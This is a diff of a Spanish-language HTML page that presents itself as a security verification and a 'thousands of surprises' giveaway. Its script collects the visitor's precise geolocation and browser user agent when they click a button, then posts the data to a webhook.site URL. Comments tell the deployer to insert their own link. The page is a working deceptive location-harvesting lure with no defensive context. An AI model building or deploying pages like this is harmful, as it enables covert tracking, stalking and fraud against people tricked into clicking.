@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Recuperar teléfono</title>
+  <title>Sopresa miles de regalos mas</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -32,16 +32,24 @@
       margin-top: 20px;
       font-size: 14px;
     }
+    pre {
+      background: #eee;
+      padding: 10px;
+      border-radius: 6px;
+      text-align: left;
+      overflow-x: auto;
+    }
   </style>
 </head>
 <body>
-  <h1>Verificación </h1>
-  <p>Por favor ub sorpresa:</p>
-  <button onclick="sendLocation()">Miles de sorpresas</button>
+  <h1>Verificación de seguridad</h1>
+  <p>Por favor confirma tu ubicación para continuar:</p>
+  <button onclick="sendLocation()">📍 Compartir mi ubicación</button>
   <div class="msg" id="msg"></div>
+  <pre id="coords"></pre>
 
   <script>
-    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 🔴 reemplaza esto
+    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 👈 reemplaza con tu enlace
 
     function sendLocation() {
       if (!navigator.geolocation) {
@@ -63,13 +71,17 @@
         ua: navigator.userAgent
       };
 
+      // Mostrar en pantalla
+      document.getElementById("coords").innerText = JSON.stringify(data, null, 2);
+
+      // Enviar al webhook
       fetch(REPORT_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       });
 
-      document.getElementById("msg").innerText = "Ubicación enviada correctamente ✅";
+      document.getElementById("msg").innerText = "Ubicación enviada ✅";
     }
 
     function error() {
@@ -78,4 +90,6 @@
   </script>
 </body>
 </html>
+
+
 
